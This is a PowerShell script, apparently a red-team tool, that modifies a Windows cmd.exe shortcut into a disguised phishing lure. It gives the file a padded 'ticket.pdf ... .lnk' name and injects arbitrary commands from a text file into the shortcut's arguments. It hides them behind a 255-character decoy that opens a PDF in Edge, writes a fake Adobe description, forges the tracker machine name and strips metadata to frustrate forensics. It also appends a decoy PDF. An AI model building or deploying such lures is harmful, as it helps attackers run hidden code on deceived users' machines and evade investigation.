Param(
$sourcepath= "$pwd\cmd.exe.lnk",
[switch] $bamboozle,
$fakepath="/C start msedge K:\ticket.pdf &",
$machineName = "ABBY-PC",
$destination= "$pwd\ticket.pdf    (encrypted)            .lnk",
$argsFile = "$pwd\commands.txt",
[switch] $verbose,
[switch] $appendFile,
$appendFilePath="$pwd\ticket.pdf",
[switch] $useextra,
[switch] $overwriteComments,
[string] $commentPath="$pwd\Adobe_desc.txt"
)

function Byte-toHexStr {
Param
([byte[]]$byteArr)
[string]$outputStr = [String]::Empty
for($i=0; $i -lt $byteArr.Length; $i++)
{
    $outputStr += $byteArr[$i].ToString("X2")+" " 
}
$outputStr.Trim()
}

function Bit-Calculator {
Param([byte[]] $byteArr)
#$hex = (Byte-toHexStr $byteArr) -replace " ", ""
#([convert]::ToInt64($hex,16))
#[bitconverter]::ToInt64($byteArr,0)
$b = [Convert]::ToString(([bitconverter]::ToInt32($byteArr,0)),2).ToCharArray()
[array]::Reverse($b)
$b -join ""
}

function Get-LinkFlagVals {
Param([string] $binary, [bool] $addDesc)
$index = 0
$positions = @()
[string] $finalFlags = "Link Flags Table:`n"
while (($index = $binary.IndexOf("1", $index)) -ne -1) {
    $positions += $index
    $index++  # Move to the next index position to continue searching
}
#Read more: https://www.sharepointdiary.com/2021/05/indexof-method-in-powershell.html#ixzz8DrV6gJyN

foreach($val in $positions)
{
    switch($val)
    {
        0
        {
            $finalFlags += "`tHasLinkTargetIDList`n"
            break
        }
        1
        {
            $finalFlags += "`tHasLinkInfo`n"
            break
        }
        2      
        {
            $finalFlags += "`tHasName`n"
            break
        }
        3
        {
            $finalFlags += "`tHasRelativePath`n"
            break
        }
        4
        {
            $finalFlags += "`tHasWorkingDir`n"
            break
        }
        5
        {
            $finalFlags += "`tHasArguments`n"
            break
        }
        6
        {
            $finalFlags += "`tHasIconLocation`n"
            break
        }
        7
        {
            $finalFlags += "`tIsUnicode`n"
            break
        }
        8      
        {
            break
        }
        9
        {
            break
        }
        10
        {
            break
        }
        11
        {
            break
        }
        19
        {
            $finalFlags +="`tEnableTargetMetadata`n"
            break
        }
        default
        {
            break
        }
    }
}
$finalFlags
}

function Get-ADtimestamp {
Param([byte[]] $byteArr)
[array]::Reverse($byteArr)
[datetime]::FromFileTime([Convert]::ToInt64(((Byte-toHexStr $byteArr) -replace ' ', ''),16))
}

function GUID-Formatter {
Param(
[System.Collections.ArrayList]$data=@(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
)
$a = $data.GetRange(0,8)
$a.Reverse()
$b = (Byte-toHexStr $a) -replace ' ', ''
$b += (Byte-toHexStr ($data.GetRange(8,8))) -replace ' ', '' 

$output = $b.Substring(8,8)+"-"+$b.Substring(4,4)+"-"+$b.Substring(0,4)+"-"
$output +=$b.Substring(16,4)+"-"+$b.Substring(20,12)
$output 
}

$srcBytes = [io.file]::ReadAllBytes($sourcepath)
[System.Collections.ArrayList] $strBytes = New-Object System.Collections.ArrayList
$strBytes.AddRange($srcBytes)

### Link FLAGS
$linkFlags = Byte-toHexStr ($strBytes.GetRange(0x14,4).ToArray())
Write-Output "[!] Link FLAGs (0x14): $linkFlags"
$linkTrans = Get-LinkFlagVals (Bit-Calculator ($strBytes.GetRange(0x14,4).ToArray()))
Write-Output "[!] $linkTrans"
if($overwriteComments)
{
    Write-Host -ForegroundColor DarkYellow "[~] Overwrite of description requested, ensuring HasName flag is set!"
    #convert to INT, then or with 4, should work
    $linkFlagsBytes = $strBytes.GetRange(0x14,4).ToArray()
    [array]::Reverse($linkFlagsBytes)
    $LinkFlagsInt = [Convert]::ToInt32(((Byte-toHexStr $linkFlagsBytes) -replace ' ', ''),16)
    $LinkFlagsInt
    $LinkFlagsInt = $LinkFlagsInt -bor 4
    $strBytes.InsertRange(0x14,[BitConverter]::GetBytes([Int32]$LinkFlagsInt))
    $strBytes.RemoveRange(0x18,4)
    $linkFlags = Byte-toHexStr ($strBytes.GetRange(0x14,4).ToArray())
    Write-Output "  -  New Link FLAGs (0x14): $linkFlags"
}

### Creation, Access, Write Times:
$createTime = Get-ADtimestamp ($strBytes.GetRange(0x1C,8).ToArray())
Write-Output "[!] Creation Time: $createTime"
$AccessTime = Get-ADtimestamp ($strBytes.GetRange(0x24,8).ToArray())
Write-Output "[!] Access Time: $AccessTime"
$WriteTime = Get-ADtimestamp ($strBytes.GetRange(0x2C,8).ToArray())
Write-Output "[!] Write Time: $WriteTime"
### file length
$filelen = Byte-toHexStr ($strBytes.GetRange(0x34,4).ToArray())
Write-Output "[!] File Length (0x34): $filelen"
### IconIndex
$icoIndx = Byte-toHexStr ($strBytes.GetRange(0x38,4).ToArray())
Write-Output "[!] Icon Index: $icoIndx"
### ShowCommand
$showComm = Byte-toHexStr ($strBytes.GetRange(0x3C,4).ToArray())
Write-Output "[!] Show Command: $showComm"
### HotKey
$hotKey = Byte-toHexStr ($strBytes.GetRange(0x40,2).ToArray())
Write-Output "[!] Hot Key: $hotKey"
### Reserved
$reserved = Byte-toHexStr ($strBytes.GetRange(0x42,2).ToArray())
Write-Output "[!] Reserved 1: $reserved"
### Reserved2
$reserved2 = Byte-toHexStr ($strBytes.GetRange(0x44,4).ToArray())
Write-Output "[!] Reserved 2: $reserved2"
### Reserved3
$reserved3 = Byte-toHexStr ($strBytes.GetRange(0x48,4).ToArray())
Write-Output "[!] Reserved 3: $reserved3"
### HasLinkTargetIDList
$offset = 0x4C
$start = $offset
if($linkTrans.Contains("HasLinkTargetIDList"))
{
    ##IDListSize
    $IDListSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($IDListSize)
    #$strIDListSize = Byte-toHexStr $IDListSize
    $IDListSize = [Convert]::ToInt16(((Byte-toHexStr $IDListSize) -replace ' ', ''),16)
    Write-Output "[!] Link Target ID List total Size: $IDListSize"

    ###IDList
    #$IDList = Byte-toHexStr ($strBytes.GetRange(0x4E,([Convert]::ToInt16(((Byte-toHexStr $IDListSize) -replace ' ', ''),16))).ToArray())
    $IDList = @()
    $start += 2 
    while($true)
    {
        $ItemIDListItem = @{}

        ##ItemIDSize
        $ItemIDSize = $strBytes.GetRange($start,2).ToArray()
        $strItemIDSize = Byte-toHexStr $ItemIDSize
        Write-Output "[!] Item ID List Item Size $strItemIDSize"
        [array]::Reverse($ItemIDSize)
        $ItemIDSize = [Convert]::ToInt16(((Byte-toHexStr $ItemIDSize) -replace ' ', ''),16)
        $ItemIDListItem.Add("Sz", $ItemIDSize) #for future development
        $ItemIDData = Byte-toHexStr ($strBytes.GetRange(($start+2),$ItemIDSize).ToArray())
        $ItemIDListItem.Add("Data", $ItemIDData) # For future development
        if($verbose)
        {
            Write-Output "[!] >>> Link Target Item: $ItemIDData"
        }

        $IDList+=$ItemIDListItem
        $start += $ItemIDSize
        if ($start -ge ($offset + $IDListSize))
        {
            $terminal = ($start.ToString("X2"))
            Write-Output "[!] Reached Terminal output at offset: $terminal"
            $start +=2 #2 Bytes for Terminal ID
            break
        }
    }
}
$offset = $start
if($linkTrans.Contains("HasLinkInfo"))
{
    ##LinkInfoSize
    $LinkInfoSize = ($strBytes.GetRange($start,4).ToArray())
    [array]::Reverse($LinkInfoSize)
    $LinkInfoSize = [Convert]::ToInt16(((Byte-toHexStr $LinkInfoSize) -replace ' ', ''),16)
    Write-Output "[!] Link Info total Size: $LinkInfoSize"
    $start+=4
##LinkInfoFlags

    ##VolumeIDOffset

    ##LocalBasePathOffset

    ##CommonNetworkRelativeLinkOffset

    ##CommonPathSuffixOffset

    ##VolumeID

    ##VolumeIDSize

    ##DriveType

    ##DriveSerialNumber

    ##VolumeLabelOffset

    ##Data

    ##LocalBasePath

    ##CommonPathSuffix

$offset += $LinkInfoSize    
}
$start = $offset
if($linkTrans.Contains("HasName"))
{
    ##Name Count <- I think this is actually Description
    ##Relative Path Count
    $NameSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($NameSize)
    $NameSize = [Convert]::ToInt16(((Byte-toHexStr $NameSize) -replace ' ', ''),16)
    Write-Output "[!] Name(?) Size: $NameSize"
    $start+=2

    ##Relative Path Data
    $NameData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,($NameSize*2)).ToArray()))
    Write-Output "[!] Name(?) Data: $NameData"
    $start+=($NameSize*2)
    if($overwriteComments)
    {
        $strBytes.RemoveRange($offset,(($NameSize*2)+2))
    }
}
if($overwriteComments)
{
        $start = $offset
        #expect text here, but this could be another place to hide data at a later time
        $commentTxt = (gc -raw $commentPath)

        $newDescSize = [BitConverter]::GetBytes([Int16]($commentTxt.Length))
        $strBytes.InsertRange($start, $newDescSize)
        $commentBytes = [Text.Encoding]::Unicode.GetBytes($commentTxt)
        Write-Host -ForegroundColor DarkYellow "[!] Inserting the following into Description Field:`n$commentTxt"
        $strBytes.InsertRange(($start+2),$commentBytes)
        $start = ($start +2 ) + ($commentBytes.Count)
}
if($linkTrans.Contains("HasRelativePath"))
{
    ##Relative Path Count
    $RelPathSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($RelPathSize)
    $RelPathSize = [Convert]::ToInt16(((Byte-toHexStr $RelPathSize) -replace ' ', ''),16)
    Write-Output "[!] Relative Path Size: $RelPathSize"
    $start+=2

    ##Relative Path Data
    $RelPathData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,($RelPathSize*2)).ToArray()))
    Write-Output "[!] Rel Path Data: $RelPathData"
    $start+=($RelPathSize*2)
}
if($linkTrans.Contains("HasWorkingDir"))
{
    #($start.ToString("X2"))
    ##Working Dir Count
    $WorkingDirSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($WorkingDirSize)
    $WorkingDirSize = [Convert]::ToInt16(((Byte-toHexStr $WorkingDirSize) -replace ' ', ''),16)
    Write-Output "[!] Working Dir Size: $WorkingDirSize"
    $start+=2

    ##Working Dir Data
    $WorkingDirData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,($WorkingDirSize*2)).ToArray()))
    Write-Output "[!] Working Dir Data: $WorkingDirData"
    $start+=($WorkingDirSize*2)
}

if($linkTrans.Contains("HasArguments"))
{
    ## Here's a good spot to place the injectable code if it has it. 
    ## We are limited to 255 via the Shell Com Object via Explorer's properties popup (allegedly), but here? 4096 B has been tossed around as a limit.
    ## Below is the code to grab the existing data
    #($start.ToString("X2"))
    
    ##Arguments Count
    $ArgsSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($ArgsSize)
    $ArgsSize = [Convert]::ToInt16(((Byte-toHexStr $ArgsSize) -replace ' ', ''),16)
    Write-Output "[!] Current Argument Size: $ArgsSize"
    ##stub to overwrite existing Args Count.
    $newArgs = (gc -raw $argsFile).TrimEnd()
    $newArgsInt = [int16]$newArgs.Length
    
    $marker = $start
    #$start is currently at Args Size
    if ($bamboozle)
    {
        #https://redteamer.tips/click-your-shortcut-and-you-got-pwned/
        #check for 4096-257 of Arg Len, throw error if over
        if(257+$newArgsInt -gt 4096)
        {
            Write-Output "[-] WARNING: Argument length too long for Bamboozle! Code may get cut off!!!"
        }

        $bLen = 255
        $amp = $false
        if(!([String]::IsNullOrEmpty($fakepath)))
        {
            if($fakepath.Length -gt 255)
            {
                Write-Output "[-] WHAT? WHY>? WHAT ARE YOU DOING?> (Fakepath Length too long, this may break stuff)"
            }
            $strBytes.InsertRange($start,[Text.Encoding]::Unicode.GetBytes($fakepath))
            $bLen = $bLen - $fakepath.Length
            $start +=($fakepath.Length*2)
            #$amp= $true
        }
        $bStr = " "*$bLen
        $strBytes.InsertRange($start,[Text.Encoding]::Unicode.GetBytes($bStr))
        $start+=($bLen*2)
        if($amp)
        {
            $strBytes.InsertRange($start,[Text.Encoding]::Unicode.GetBytes("&"))
            $start +=2
            $bLen +=1
            $newArgsInt +=1
        }

       $newArgsInt +=255
    }

    Write-Output "[!] New Argument Size: $newArgsInt"
    $newArgsSize = [BitConverter]::GetBytes([Int16]$newArgsInt)
    $strBytes.InsertRange($marker, $newArgsSize)
    $strBytes.RemoveRange($start+2,2)
    #($strBytes.GetRange($marker,4).ToArray())
    #($strBytes.GetRange($start,4).ToArray())
    $start+=2

    ##Argument Data
    $ArgsData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,($ArgsSize*2)).ToArray()))
    #Write-Output "[!] Current Argument Data: $ArgsData"
    ##stub to overwrite existing Args 

    #Write-Output "[!] New Argument Data:     $newArgs"
    $strBytes.InsertRange($start, [Text.Encoding]::Unicode.GetBytes($newArgs.Trim()))
    $strBytes.RemoveRange($start+($newArgs.Length*2),($ArgsSize*2))
    #$start+=2
    
    $start+=($newArgs.Length*2)
}

if($linkTrans.Contains("HasIconLocation"))
{
    ##Icon Location Count
    $IconLocSize = ($strBytes.GetRange($start,2).ToArray())
    [array]::Reverse($IconLocSize)
    $IconLocSize = [Convert]::ToInt16(((Byte-toHexStr $IconLocSize) -replace ' ', ''),16)
    Write-Output "[!] Icon Location Size: $IconLocSize"
    $start+=2

    ##Icon Location Data
    $IconLocData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,($IconLocSize*2)).ToArray()))
    Write-Output "[!] Icon Location Data: $IconLocData"
    $start+=($IconLocSize*2)

}

###After all the strings, Extra Data follows. There is no control number here, so... loop?
##going to try using this as space for packing data in
if($useextra -and $appendFile)
{
    $strBytes.RemoveRange($start, ($strBytes.Count-$start))
    $lnkLenBytes = [BitConverter]::GetBytes([Int32]$start+8)
    $strBytes.SetRange(0x48, $lnkLenBytes)



    $appendFileBytes = [io.file]::ReadAllBytes($appendFilePath)
    $lnkLenBytes = [BitConverter]::GetBytes([Int32]$appendFileBytes.Count)

    $strBytes.AddRange($lnkLenBytes)
    $strBytes.AddRange(@(0x07,0x0,0x0,0xa0))
    $strBytes.AddRange($appendFileBytes)
    $strBytes.AddRange(@(0x0,0x0,0x0,0x0))
    $strBytes.AddRange(@(0x00,0x0,0x0,0x0))
}
else{
$extra=$true
while($extra)
{
    if($start -lt ($strBytes.Count-4))
    {
        ##Extra Block Count
        $ExtraBlkSize = ($strBytes.GetRange($start,4).ToArray())
        [array]::Reverse($ExtraBlkSize)
        $ExtraBlkSize = [Convert]::ToInt32(((Byte-toHexStr $ExtraBlkSize) -replace ' ', ''),16)
        Write-Output "[!] Extra Blk Size: $ExtraBlkSize"
        $start+=4

        $blkSig = Byte-toHexStr ($strBytes.GetRange($start,(4)).ToArray())
        Write-Output "    Block signature $blkSig"
        $start+=4

        switch([int]$ExtraBlkSize)
        {
            0
            {
                #should be the terminal block
                $extra=$false
            }
            96
            {
            Write-Output "  ~~Potential Tracker Block Found!~~"

            $blkLen = Byte-toHexStr ($strBytes.GetRange($start,(4)).ToArray())
            Write-Output "     Block Length $blkLen"
            $start+=4

            $blkVer = Byte-toHexStr ($strBytes.GetRange($start,(4)).ToArray())
            Write-Output "     Block Version $blkVer"
            $start+=4

            ### Something that you want to stomp
            $blkMachineID = [Text.Encoding]::AScii.GetString($strBytes.GetRange($start,(16)).ToArray())
            Write-Output "     Block Machine ID $blkMachineID"
            [System.Collections.ArrayList] $machineNameList = new-object System.Collections.ArrayList
            $machineNameList.AddRange([Text.Encoding]::ASCII.GetBytes($machineName))
            if ($machineNameList.Length -lt 16)
            {
                for($i=$machineNameList.Count; $i -lt 16; $i++ )
                {
                    $machineNameList.Add([byte]0) | Out-Null
                }
            }
            Write-Host -ForegroundColor DarkYellow "---> Stomping Machine Name with $machineName"
            $strBytes.SetRange($start,$machineNameList)
            $start+=16

            $blkDroid = Byte-toHexStr ($strBytes.GetRange($start,(32)).ToArray())
            Write-Output "     Block Droid $blkDroid"
            $start+=32

            $blkDroidBirth = Byte-toHexStr ($strBytes.GetRange($start,(32)).ToArray())
            Write-Output "     Block Droid Birth $blkDroidBirth"
            $start+=32
            break
            }
            788
            {
            Write-Output "  ~~Potential Darwin Block Found!~~"

            $DarwinDLAnsi = [Text.Encoding]::AScii.GetString($strBytes.GetRange($start,(260)).ToArray())
            Write-Output "`tDarwinDLAnsi $DarwinDLAnsi"
            $start+=260

            $DarwinDLUni = [Text.Encoding]::Unicode.GetString($strBytes.GetRange($start,(520)).ToArray())
            Write-Output "`tDarwinDLUni $DarwinDLUni"
            $start+=520
            break
            }
            default
            {
            if ($blkSig -eq "09 00 00 A0")
            {
                ### We have Property Sets
                Write-Output "  ~~Potential PropertyStoreDataBlock Found!~~"
                $propCount = 0
                $propStart = $start
                while($true)
                {
                    $PropSetLen = $strBytes.GetRange($start,(4)).ToArray()
                    [array]::Reverse($PropSetLen)
                    $PropSetLen = [Convert]::ToInt32(((Byte-toHexStr $PropSetLen) -replace ' ', ''),16)
                    Write-Output "     Property Set Length $PropSetLen"
                    if([int]$PropSetLen -eq 0)
                    {
                        break
                    }
                    $propCount +=$PropSetLen
                    $start+=4

                    $PropSetVerArr = $strBytes.GetRange($start,(4)).ToArray()
                    $PropSetVer = Byte-toHexStr $PropSetVerArr
                    if ($PropSetVer -eq "31 53 50 53")
                    {
                        $PropSetVer = [Text.Encoding]::Ascii.GetString($PropSetVerArr)
                    }
                    Write-Output "     Property Set Version $PropSetVer"
                    $start+=4

                    ### Something that you want to stomp #this also seems to break for no reason in ISE
                    $PropSetGUID = $strBytes.GetRange($start,16)
                    $PropSetGUID = GUID-Formatter -data $PropSetGUID
                    Write-Output "     Property Set GUID $PropSetGUID"
                    $start+=16

                    #$PropSetInnerData = [Text.Encoding]::Unicode.GetString(($strBytes.GetRange($start,$PropSetInnerLen).ToArray()))
                    $PropSetInnerData = Byte-toHexStr ($strBytes.GetRange($start,$PropSetLen-24).ToArray())
                    Write-Output "     Property Set Inner Data $PropSetInnerData"
                    $start+=$PropSetLen-24
                }
                Write-Output "[-] Removing $propCount bytes from PropertyDataBlock ..."
                $strBytes.RemoveRange($propStart,$propCount)
            }
            else
            {
                $ExtraBlkData = $strBytes.GetRange($start,($ExtraBlkSize-8)).ToArray()
                Write-Output "[!] Extra Block Data: $ExtraBlkData"
                $start+=($ExtraBlkSize-8)	
  }
            break
            }
       }
        
    }
    else
    {
    break
    }
}
}

if($appendFile -and !($useextra))
{
    $lnkLenBytes = [BitConverter]::GetBytes([Int32]$strBytes.Count)
    $strBytes.SetRange(0x48, $lnkLenBytes)

    $appendFileBytes = [io.file]::ReadAllBytes($appendFilePath)
    $strBytes.AddRange($appendFileBytes)
}

Write-Host -ForegroundColor Green "[+] Writing changes to $destination!!!"
[io.file]::WriteAllBytes($destination,$strBytes.ToArray())